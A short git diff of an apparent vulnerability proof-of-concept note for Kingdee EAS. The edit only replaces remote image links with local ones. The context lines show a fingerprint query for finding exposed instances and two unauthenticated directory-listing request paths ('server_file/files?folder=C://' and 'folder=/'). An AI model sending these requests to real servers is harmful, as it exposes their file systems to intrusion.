@@ -22,7 +22,7 @@ app="Kingdee-EAS"
 
 
 
-![1](https://typora-1308934770.cos.ap-beijing.myqcloud.com/202202090144781.png)
+![1](./images/202202090144781.png)
 
 漏洞POC
 
@@ -36,4 +36,4 @@ appmonitor/protected/selector/server_file/files?folder=C://&suffix=
 appmonitor/protected/selector/server_file/files?folder=/&suffix=
 ```
 
-![2](https://typora-1308934770.cos.ap-beijing.myqcloud.com/202202090144057.png)
+![2](./images/202202090144057.png)
